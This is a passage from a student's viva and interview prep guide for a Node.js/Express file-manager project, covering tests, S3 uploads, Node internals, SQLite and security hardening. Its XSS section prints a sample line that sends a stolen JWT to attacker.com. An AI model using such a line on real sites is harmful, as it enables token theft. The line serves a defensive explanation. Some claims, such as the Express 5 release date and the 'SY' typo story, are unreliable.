    expect(res.body.message).toBe('File deleted');

    // Verify it is gone from subsequent requests
    const checkRes = await request(app)
      .get(`/api/files/${uploadedFileId}/download`)
      .set('Authorization', `Bearer ${userToken}`);

    expect(checkRes.status).toBe(404);
  });
});
```

**What to Say to Your Mentor:**
> *"To test the file upload API in Jest, I use Supertest's `.attach('file', filePath)` method, which constructs a RFC-compliant `multipart/form-data` request stream with boundaries. I chain `.set('Authorization', 'Bearer ' + token)` to verify that unauthenticated uploads are blocked with 401, disallowed MIME types receive 400, and valid files receive 201 with metadata stored in SQLite. After the test suite completes, an `afterAll` lifecycle hook unlinks test files from disk to prevent test pollution."*

---

## PART 17: AWS S3 & LocalStack — Complete Production Code Implementation

---

### Q43: The mentor noted: "Good to have: run AWS services locally and store the file in S3 directly". Walk through the full production-grade implementation: Docker setup, S3 SDK installation, memoryStorage, upload, presigned download, and deletion.

**Answer:**

**Why did the mentor write "store the file in SY directly"?**
"SY" is a classic keyboard typo for **S3** (the 'Y' and 'U' keys are near each other or typed rapidly). In cloud engineering, storing uploads in an **AWS S3 bucket** rather than local disk is the golden standard.

---

### Step 1: Run LocalStack Locally with Docker

LocalStack is an open-source emulator that runs AWS cloud services entirely inside a Docker container on your local computer. It is 100% free and requires zero AWS account credentials.

Run this command in terminal:
```powershell
docker run -d --name localstack-s3 -p 4566:4566 -e SERVICES=s3 localstack/localstack
```

Verify S3 is running:
```powershell
curl http://localhost:4566/_localstack/health
# Returns: {"services": {"s3": "running"}}
```

Create the storage bucket using AWS CLI or awslocal:
```powershell
aws --endpoint-url=http://localhost:4566 s3 mb s3://file-manager-bucket
```

---

### Step 2: Install Official AWS SDK v3 Packages

In Node.js, we use modular AWS SDK v3:
```powershell
npm install @aws-sdk/client-s3 @aws-sdk/s3-request-presigner
```

---

### Step 3: Configure AWS S3 Client (`config/s3.js`)

```javascript
// config/s3.js
const { S3Client } = require('@aws-sdk/client-s3');

// When developing locally with LocalStack:
// - endpoint points to http://localhost:4566
// - forcePathStyle is true (LocalStack requires http://localhost:4566/bucket/key)
// - dummy credentials are accepted
const s3Client = new S3Client({
  region: process.env.AWS_REGION || 'us-east-1',
  endpoint: process.env.AWS_ENDPOINT || 'http://localhost:4566',
  forcePathStyle: true,
  credentials: {
    accessKeyId: process.env.AWS_ACCESS_KEY_ID || 'test',
    secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY || 'test',
  },
});

const BUCKET_NAME = process.env.AWS_BUCKET_NAME || 'file-manager-bucket';

module.exports = { s3Client, BUCKET_NAME };
```

---

### Step 4: Switch Multer from Disk Storage to Memory Storage

When storing files in S3, **you do not write the file to your local hard drive**. Instead, you tell Multer to hold the binary file stream in RAM as a Node `Buffer`:

```javascript
// routes/fileRoutes.js
const multer = require('multer');

// Memory storage provides req.file.buffer
const storage = multer.memoryStorage();

const upload = multer({
  storage,
  limits: { fileSize: 5 * 1024 * 1024 }, // 5 MB
});
```

---

### Step 5: S3 Upload Controller (`uploadFile`)

```javascript
// controllers/fileController.js
const { PutObjectCommand } = require('@aws-sdk/client-s3');
const { s3Client, BUCKET_NAME } = require('../config/s3');
const crypto = require('crypto');
const File = require('../models/file');

const uploadFile = async (req, res) => {
  if (!req.file) {
    return res.status(400).json({ message: 'No file uploaded' });
  }

  // 1. Generate unique S3 Key (e.g., "550e8400-e29b-41d4-a716-446655440000.pdf")
  const fileExt = path.extname(req.file.originalname) || '.bin';
  const s3Key = `${crypto.randomUUID()}${fileExt}`;

  // 2. Upload file buffer directly to S3
  const putCommand = new PutObjectCommand({
    Bucket: BUCKET_NAME,
    Key: s3Key,
    Body: req.file.buffer,             // binary buffer from Multer memoryStorage
    ContentType: req.file.mimetype,    // e.g. "application/pdf"
    Metadata: {
      originalName: req.file.originalname,
      uploadedBy: String(req.user.id),
    },
  });

  await s3Client.send(putCommand);

  // 3. Store S3 metadata in SQLite database
  const saved = File.create({
    original_name: req.file.originalname,
    display_name: req.body.display_name || req.file.originalname,
    stored_name: s3Key,
    mime_type: req.file.mimetype,
    size: req.file.size,
    path: `s3://${BUCKET_NAME}/${s3Key}`, // S3 URI
    uploaded_by: req.user.id,
  });

  res.status(201).json(toPublic(saved));
};
```

---

### Step 6: Secure Download using S3 Presigned URLs

Instead of proxying the large file download through your Node.js server (which consumes server bandwidth and CPU), you generate a **cryptographically signed Pre-signed URL**. The client browser downloads the file directly from S3!

```javascript
const { GetObjectCommand } = require('@aws-sdk/client-s3');
const { getSignedUrl } = require('@aws-sdk/s3-request-presigner');

const downloadFile = async (req, res) => {
  const file = File.findByIdAndUser(req.params.id, req.user.id);
  if (!file) return res.status(404).json({ message: 'File not found' });

  const getCommand = new GetObjectCommand({
    Bucket: BUCKET_NAME,
    Key: file.stored_name,
    ResponseContentDisposition: `attachment; filename="${file.display_name}"`,
  });

  // Generate temporary download link valid for 15 minutes (900 seconds)
  const presignedUrl = await getSignedUrl(s3Client, getCommand, { expiresIn: 900 });

  // Option A: Send URL back in JSON (for SPA or mobile app)
  // res.json({ downloadUrl: presignedUrl });

  // Option B: Redirect browser directly to S3 URL (seamless download)
  res.redirect(presignedUrl);
};
```

---

### Step 7: S3 File Deletion (`deleteFile`)

```javascript
const { DeleteObjectCommand } = require('@aws-sdk/client-s3');

const deleteFile = async (req, res) => {
  const file = File.findByIdAndUser(req.params.id, req.user.id);
  if (!file) return res.status(404).json({ message: 'File not found' });

  // 1. Delete database record
  File.deleteByIdAndUser(file.id, req.user.id);

  // 2. Delete object from S3 bucket
  const deleteCommand = new DeleteObjectCommand({
    Bucket: BUCKET_NAME,
    Key: file.stored_name,
  });
  await s3Client.send(deleteCommand);

  res.json({ message: 'File deleted from S3 and database' });
};
```

---

### Local Disk vs AWS S3: Mentor Comparison Table

| Feature | Local Disk Storage (Current) | AWS S3 / LocalStack (Cloud Ready) |
|---|---|---|
| **Storage Location** | Local folder `uploads/` on server disk | Distributed Amazon cloud object store |
| **Scalability** | Limited by single server hard disk capacity | Virtually infinite (exabytes) |
| **Multi-Server Deployment** | ❌ Fails: Server 2 cannot see files on Server 1 | ✅ Works: All Node servers connect to same S3 bucket |
| **Download Performance** | Consumes Node.js thread and bandwidth | Offloaded to S3 via Pre-signed URLs |
| **Durability / Backup** | Lost if server disk crashes | 99.999999999% (11 nines) durability |
| **Local Development** | Zero setup needed | Requires Docker + LocalStack |

---

## PART 18: Advanced Node.js Internals (The "How Node Works" Case Study Mastery)

---

### Q44: Deep dive: How does Node.js work under the hood? Explain V8 vs Libuv, Call Stack, Microtasks vs Macrotasks execution order, Libuv Thread Pool, and Streams vs Buffers.

**Answer:**

**The Two Pillars of Node.js:**
Node.js is **NOT a programming language** and it is **NOT a framework**.
Node.js is a **C++ runtime environment** composed of two core engines:
1. **Google V8 Engine:** Written in C++. Compiles JavaScript code into native machine code using JIT (Just-In-Time) compilation. Manages the **Memory Heap** (object memory) and **Call Stack** (function execution).
2. **Libuv Library:** Written in C. A cross-platform asynchronous I/O library that manages the **Event Loop**, **Thread Pool**, and provides OS abstraction for asynchronous networking and file systems.

```
+-----------------------------------------------------------+
|                       YOUR CODE                           |
|      (server.js, controllers, models, routes)             |
+-----------------------------------------------------------+
|                 NODE.JS CORE MODULES                      |
|             (fs, http, crypto, path, stream)              |
+-----------------------------+-----------------------------+
|          GOOGLE V8          |            LIBUV            |
| - JavaScript Execution      | - Event Loop                |
| - Call Stack                | - Thread Pool (4 threads)   |
| - Memory Heap               | - Event Demultiplexer       |
| - Garbage Collection        | - Non-blocking I/O (epoll)  |
+-----------------------------+-----------------------------+
|                     OPERATING SYSTEM                      |
|         (Windows IOCP / Linux epoll / macOS kqueue)       |
+-----------------------------------------------------------+
```

---

### The 6 Phases of the Libuv Event Loop (In Exact Order)

When the Call Stack is empty, the Event Loop rotates through these 6 phases in a continuous circle:

1. **Timers Phase:** Executes callbacks scheduled by `setTimeout()` and `setInterval()` whose delay has expired.
2. **Pending Callbacks (I/O Callbacks):** Executes deferred I/O callbacks (such as TCP socket connection errors).
3. **Idle / Prepare Phase:** Internal use only by Libuv.
4. **Poll Phase (The Heart of Node):** Retrieves new I/O events (incoming HTTP requests, socket data, database responses). If no timers are scheduled, Node will **sleep/wait** here for new events so it doesn't waste CPU cycles.
5. **Check Phase:** Executes callbacks scheduled by **`setImmediate()`**.
6. **Close Callbacks Phase:** Executes close handlers like `socket.on('close', ...)`.

---

### Microtasks vs Macrotasks: The Ultimate Interview Question

Mentors love asking: *"What executes first: `setTimeout`, `setImmediate`, `process.nextTick`, or `Promise.then`?"*

**The Rule:**
Microtasks run **immediately** between every single operation, before the Event Loop is allowed to proceed to the next phase!

**Priority Order:**
```
1. process.nextTick()     <- Highest priority Microtask (runs before ANY promise)
2. Promise.then() / catch <- Microtask (runs before any Macrotask)
3. setTimeout(fn, 0)      <- Macrotask (Timers Phase)
4. setImmediate(fn)       <- Macrotask (Check Phase)
```

**Proof with Code:**
```javascript
setTimeout(() => console.log('1. setTimeout'), 0);
setImmediate(() => console.log('2. setImmediate'));
Promise.resolve().then(() => console.log('3. Promise.then'));
process.nextTick(() => console.log('4. process.nextTick'));

// OUTPUT:
// 4. process.nextTick   (Microtask Queue 1)
// 3. Promise.then       (Microtask Queue 2)
// 1. setTimeout         (Timers Phase)
// 2. setImmediate       (Check Phase)
```

---

### The Libuv Thread Pool: When is Node.js Multi-Threaded?

People say *"Node.js is single-threaded."* **That is only half true!**
- JavaScript code execution is **single-threaded** (one Call Stack).
- But Node's background operations use **multiple threads** via Libuv's Worker Thread Pool (default: **4 threads**, configurable via `process.env.UV_THREADPOOL_SIZE`).

| Operation | Uses Worker Thread Pool? | How it actually works |
|---|---|---|
| **File I/O (`fs.readFile`, `fs.unlink`)** | **YES (Thread Pool)** | Most operating systems do not have true async file system APIs, so Libuv offloads disk operations to background worker threads. |
| **Password Hashing (`bcrypt.hash`)** | **YES (Thread Pool)** | CPU-intensive mathematical calculations run on background threads so the main event loop thread doesn't freeze. |
| **Cryptography (`crypto.pbkdf2`)** | **YES (Thread Pool)** | Intensive encryption math runs in the thread pool. |
| **Network I/O (Express HTTP, `fetch`)** | **NO (Zero Threads)** | Uses OS asynchronous kernel primitives (`epoll` on Linux, `IOCP` on Windows). The OS manages the sockets and notifies Node via interrupts. |

---

### Streams vs Buffers in Multer: Why It Saves Your Server from Crashing

**Buffer Approach (Memory Heavy):**
```
Client Upload (1 GB) -> [Load 1 GB into Server RAM] -> Write to Disk
```
- If 10 users upload simultaneously: `10 users * 1 GB = 10 GB RAM`.
- Your server runs out of memory and crashes with **JavaScript heap out of memory**.

**Stream Approach (What Multer and Node Streams do):**
```
Client Upload (1 GB) -> [64 KB Chunk] -> [Write to Disk] -> [64 KB Chunk] -> [Write to Disk] ...
```
- At any instant in time, only **64 KB** is in memory!
- Whether the file is 10 MB or 10 GB, server RAM usage stays tiny and constant.
- Multer uses the **`busboy`** streaming library to parse multipart chunks on the fly.

---

## PART 19: Database Transactions & Concurrency with better-sqlite3

---

### Q45: What are database transactions? How does `db.transaction()` work in `better-sqlite3`? How does SQLite WAL mode handle concurrent readers and writers without deadlock?

**Answer:**

### What is a Database Transaction?
A transaction is a group of database operations that execute as a single atomic unit. It follows the **ACID** principle:
- **Atomicity:** All operations succeed, or all are rolled back. No halfway states.
- **Consistency:** Database constraints (foreign keys, uniqueness) are enforced before and after.
- **Isolation:** Concurrent transactions cannot see each other's uncommitted changes.
- **Durability:** Once committed, changes are permanent even if power is cut.

---

### How to Write a Transaction in `better-sqlite3`

In `better-sqlite3`, transactions are defined using **`db.transaction()`**:

```javascript
// models/user.js
const deleteUserAndCleanup = db.transaction((userId) => {
  // Step 1: Query all files owned by user
  const userFiles = db.prepare('SELECT stored_name FROM files WHERE uploaded_by = ?').all(userId);

  // Step 2: Delete user files from database table
  db.prepare('DELETE FROM files WHERE uploaded_by = ?').run(userId);

  // Step 3: Delete user record
  const result = db.prepare('DELETE FROM users WHERE id = ?').run(userId);

  // If any line above throws an error:
  // AUTOMATIC ROLLBACK: neither files nor user are deleted!

  // Return the file list so controller can delete physical files from disk
  return userFiles;
});

// To execute:
const filesToDelete = deleteUserAndCleanup(5);
```

**Why this is brilliant:**
If `better-sqlite3` encounters any error or thrown exception inside the function, it **automatically issues a `ROLLBACK`**. If the function returns normally, it **automatically issues a `COMMIT`**.

---

### SQLite WAL Mode (Write-Ahead Logging) Under the Hood

In `config/db.js:14`, we enable WAL mode:
```javascript
db.pragma('journal_mode = WAL');
```

**What happens on your hard drive:**
Notice that beside `app.db`, SQLite creates two temporary files:
1. **`app.db-wal` (Write-Ahead Log):** Changes are appended here first.
2. **`app.db-shm` (Shared Memory Index):** A shared memory map that keeps track of which blocks are in the WAL file.

**The Golden Concurrency Benefit:**
- **Standard Rollback Mode (Default):** A writer locks the entire database file. While someone is writing, **readers cannot read** (they get `SQLITE_BUSY`).
- **WAL Mode:** Writers append new records to `app.db-wal`. Readers read unchanged pages from `app.db` and new pages from `app.db-wal`.
- **Result:** **READERS NEVER BLOCK WRITERS, AND WRITERS NEVER BLOCK READERS!**
- Multiple users can browse the dashboard simultaneously while another user is uploading a file.

---

## PART 20: Express 5 vs Express 4 Architecture Differences

---

### Q46: Our `package.json` uses Express 5.3.0. Why is Express 5 significant for Node.js developers, and how does it change async/await error handling compared to Express 4?

**Answer:**

In February 2024, Express 5 was officially released after years of development. Our project runs on **Express `^5.3.0`**.

Here is why Express 5 is a massive upgrade over Express 4:

### 1. Automatic Async/Await Error Handling (The #1 Game Changer)

**In Express 4:**
If an `async` route handler threw an error or returned a rejected Promise:
```javascript
// Express 4 code
app.get('/api/files', async (req, res) => {
  const files = await fetchFromDb(); // If this throws an error...
  res.json(files);
  // In Express 4: The server HANGS! The request never finishes!
  // Node emits: UnhandledPromiseRejectionWarning
});
```
In Express 4, you were forced to wrap EVERY SINGLE async function in `try/catch` and manually call `next(err)`, or install an extra third-party package like `express-async-errors`.

**In Express 5 (Our Project):**
Express 5 natively supports Promises! If an `async` controller throws an error or rejects:
```javascript
// Express 5 (our fileController.js)
const uploadFile = async (req, res) => {
  const saved = File.create({ ... }); // if DB throws an error...
  res.status(201).json(saved);
  // Express 5 automatically catches the rejected promise and
  // forwards it directly to your central error middleware!
};
```

### 2. Path-to-RegExp Upgrade
Express 5 upgraded its routing parser:
- Wildcard routing `*` requires explicit naming (e.g. `/*splat`).
- Safer regex route parameters prevent ReDoS (Regular Expression Denial of Service) vulnerabilities.

### 3. Deprecated Methods Removed
- `res.send(status, body)` removed — you must use `res.status(code).send(body)`.
- `req.param(name)` removed — you must use specific properties: `req.params`, `req.query`, or `req.body`.

---

## PART 21: Advanced Security Defense in Depth

---

### Q47: Beyond basic JWT and bcrypt: How would you protect this project against MIME spoofing (Magic Bytes), XSS (localStorage vs httpOnly cookies), and missing HTTP security headers?

**Answer:**

If your mentor wants to see if you think like a Senior Security Engineer, explain these three enhancements:

### 1. MIME Spoofing & Magic Bytes Verification
**The Vulnerability:**
In `fileRoutes.js`, we check `file.mimetype` from Multer. But Multer gets that MIME type from the client's HTTP header (`Content-Type: image/jpeg`).
An attacker can take a malicious Windows executable (`malware.exe`), rename it to `family_photo.jpg`, and send it. Multer will believe it is an image!

**The Professional Solution (Magic Bytes):**
Files have **magic numbers** — specific binary bytes at the very beginning of the file:
- PNG always starts with: `89 50 4E 47` (`.PNG`)
- JPEG always starts with: `FF D8 FF`
- PDF always starts with: `25 50 44 46` (`%PDF`)
- Windows EXE always starts with: `4D 5A` (`MZ`)

We can use the `file-type` npm package to inspect the actual buffer bytes:
```javascript
const { fileTypeFromBuffer } = require('file-type');

const validateMagicBytes = async (req, res, next) => {
  const type = await fileTypeFromBuffer(req.file.buffer);
  if (!type || type.mime !== req.file.mimetype) {
    return res.status(400).json({ message: 'File content does not match its claimed MIME type!' });
  }
  next();
};
```

---

### 2. Storing JWT in `localStorage` vs `httpOnly` Cookies

**Current Implementation:**
Our frontend saves the JWT in the browser's `localStorage`:
```javascript
localStorage.setItem('token', data.token);
```

**The Security Risk (XSS):**
Any JavaScript executing on the page (e.g., from an injected script or compromised CDN library) can run:
```javascript
const stolenToken = localStorage.getItem('token');
fetch('https://attacker.com/steal?token=' + stolenToken);
```

**The Senior Solution (`httpOnly` Cookies):**
Store the JWT inside an **`httpOnly, Secure, SameSite=Strict`** cookie:
```javascript
// In authController.js on login/register:
res.cookie('token', token, {
  httpOnly: true,  // JavaScript CANNOT access this cookie (100% immune to XSS theft)
  secure: true,    // Sent ONLY over HTTPS
  sameSite: 'strict', // Immune to CSRF (Cross-Site Request Forgery)
  maxAge: 24 * 60 * 60 * 1000, // 1 day
});
```
The browser automatically attaches the cookie to every request, so the frontend code doesn't even need to touch the token.

---

### 3. Helmet Middleware (HTTP Security Headers)

Express by default announces itself with the header `X-Powered-By: Express`, which tells attackers what server software you run.

Installing **`helmet`** (`npm install helmet`) sets 11 HTTP security headers:
```javascript
// server.js
const helmet = require('helmet');
app.use(helmet());
```
- `X-Content-Type-Options: nosniff` (stops browsers from guessing file types)
- `X-Frame-Options: DENY` (prevents your app from being embedded in an iframe for Clickjacking)
- `Strict-Transport-Security` (enforces HTTPS)
- `Content-Security-Policy` (restricts sources of scripts and styles)

---

## PART 22: Mentor Viva Simulation — 10 Rapid-Fire Questions & Model Answers

---

### Q48: 10 Rapid-fire questions your mentor might ask to test if you wrote the code yourself or used a boilerplate, with exact, confident answers.

**Answer:**

Here are 10 quick-fire questions mentors ask when they want to verify real understanding:

#### 1. "Where in your code is the database initialized?"
> **Answer:** *"In `config/db.js`, lines 9–40. It opens `data/app.db`, turns on foreign keys and WAL mode via PRAGMA statements, and runs `CREATE TABLE IF NOT EXISTS` for users and files."*

#### 2. "Why does `User.findById` not return the `password_hash` column?"
> **Answer:** *"In `models/user.js:12`, `selectById` deliberately omits `password_hash` following the principle of least privilege. If a controller fetches a user to return user profile data, there is zero risk of leaking the hashed password to the client."*

#### 3. "What happens if two users try to register the exact same username at the exact same millisecond?"
> **Answer:** *"Even if both pass the `findByUsername` check simultaneously, the SQLite database table has a `UNIQUE` constraint on the `username` column (`config/db.js:22`). The second insert will throw an `SQLITE_CONSTRAINT_UNIQUE` error, which our controller catches in `controllers/authController.js:50` and returns HTTP 409 Conflict."*

#### 4. "How do you ensure user A cannot delete user B's uploaded file?"
> **Answer:** *"Ownership enforcement is baked directly into the SQL query in `models/file.js:17`: `DELETE FROM files WHERE id = ? AND uploaded_by = ?`. Because `uploaded_by` is taken strictly from the verified JWT token (`req.user.id`), a user can only ever match rows that belong to them."*

#### 5. "Why did you use `crypto.randomUUID()` for file storage names instead of keeping the user's original filename?"
> **Answer:** *"To prevent file overwrites when two users upload `resume.pdf`, and to eliminate Path Traversal attacks where a malicious filename like `../../windows/system32/evil.exe` tries to escape the `uploads/` folder."*

#### 6. "What happens if a user uploads a file larger than 5 megabytes?"
> **Answer:** *"Multer intercepts the stream via its `limits: { fileSize: 5 * 1024 * 1024 }` rule, halts the upload, and emits a `MulterError` with code `LIMIT_FILE_SIZE`. The central error handler in `server.js:50` catches this and sends HTTP 413 Payload Too Large."*

#### 7. "Why is `require.main === module` used around `app.listen()` in server.js?"
> **Answer:** *"When running the app normally (`node server.js`), `require.main === module` is true, so the server listens on port 5000. But when Jest imports `server.js` via Supertest, `require.main` is Jest's runner, so `app.listen()` is bypassed. This prevents `EADDRINUSE: port already in use` errors and allows ephemeral ports."*

#### 8. "Why did you use `afterAll` in `auth.test.js`?"
> **Answer:** *"Because tests insert real test users into the database during integration testing. The `afterAll` lifecycle hook runs an automated cleanup query (`DELETE FROM users WHERE username LIKE 'user_%'`) so test pollution never accumulates."*

#### 9. "What is the difference between `fs.unlinkSync` and `fs.promises.unlink`?"
> **Answer:** *"`fs.unlinkSync` is synchronous and blocks the entire Node.js single thread until the disk deletes the file, stopping all other user requests. `fs.promises.unlink` is asynchronous, returns a Promise, and offloads the disk deletion to Libuv's thread pool without blocking the Event Loop."*

#### 10. "If you deploy 5 instances of this app behind an Nginx load balancer tomorrow, what two things break first?"
> **Answer:** *"First, the local SQLite database file cannot be shared safely across 5 physical servers concurrently — we would need to migrate to PostgreSQL or MySQL. Second, local disk storage in `uploads/` fails because an upload to server 1 cannot be downloaded if the next request routes to server 2 — we would need to migrate storage to AWS S3 or LocalStack."*


---

## QUICK REFERENCE — Say These in Your Own Words

| Topic | What to say |
|---|---|
| **What is Node.js** | "Runtime environment that lets JavaScript run on a server, built on V8 engine, single-threaded but non-blocking through the Event Loop" |
| **Event Loop** | "Node's mechanism to handle async I/O without blocking — delegates work to OS, picks up callbacks when done, keeping the one thread free for more requests" |
| **What is Express** | "Lightweight web framework for Node that handles routing, middleware chaining, request parsing, and response helpers" |
| **What is middleware** | "A function with (req, res, next) that sits in the request pipeline — can modify the request, block it, or pass it forward" |
| **What is JWT** | "A self-contained, cryptographically signed token: header.payload.signature. Server signs it with a secret, client sends it back, server verifies the signature" |
| **What is bcrypt** | "An intentionally slow one-way password hashing algorithm with a random salt, designed to make brute-force attacks impractical" |
| **What is SQL injection** | "An attack where user input is inserted into SQL strings — prevented by prepared statements which separate SQL structure from data" |
| **What is IDOR** | "Accessing another user's resource by guessing IDs — prevented by including uploaded_by in every WHERE clause" |
| **What is MVC** | "Model-View-Controller: Models talk to database, Views are HTML/CSS/JS, Controllers coordinate between them" |
| **What is SQLite** | "File-based relational database, no server needed. We use WAL mode for concurrent access" |
| **What is Multer** | "Express middleware that parses multipart/form-data, streams files to disk, provides req.file" |
| **What is Jest** | "JavaScript testing framework with test runner, assertions, and lifecycle hooks" |
| **What is Supertest** | "HTTP testing library that makes requests to Express apps without starting a real server" |
| **What is S3** | "AWS cloud object storage — unlimited scale, 11-nines durability, files stored in buckets" |
| **What is LocalStack** | "Docker container that emulates AWS services locally for development without AWS costs" |
| **What is logging** | "Recording application events for debugging, security monitoring, and audit trails" |
| **What is rate limiting** | "Restricting how many requests an IP can make per time window — prevents brute force attacks" |
| **Validation Middleware** | "A middleware function using (req, res, next) that validates and sanitizes input data at the boundary before the controller runs" |
| **Query Parameters** | "Key-value pairs in the URL after '?' used for filtering, searching, and pagination in GET requests without altering resource identifiers" |
| **Express 5** | "The modern major version of Express that natively catches rejected promises in async route handlers without needing try/catch wrappers" |
| **Streams vs Buffers** | "Buffers load the whole file into RAM at once causing out-of-memory crashes; Streams process files in small 64KB chunks keeping memory constant" |
| **Libuv Thread Pool** | "A pool of 4 worker threads used by Node for blocking tasks like file I/O, crypto hashing, and compression while the main JS thread stays free" |
| **Magic Bytes** | "The first few signature bytes of a binary file that prove its real format, preventing attackers from disguising executables as images" |
| **Presigned URLs** | "Time-limited cryptographic URLs allowing clients to download or upload directly to S3 without exposing AWS credentials" |
| **Database Transactions** | "Atomic groups of operations executed via db.transaction() where either every step succeeds or all changes roll back completely" |

---

*This document was written from your project code at:*
*`C:\Users\ASUS\OneDrive\Desktop\File_Manager`*
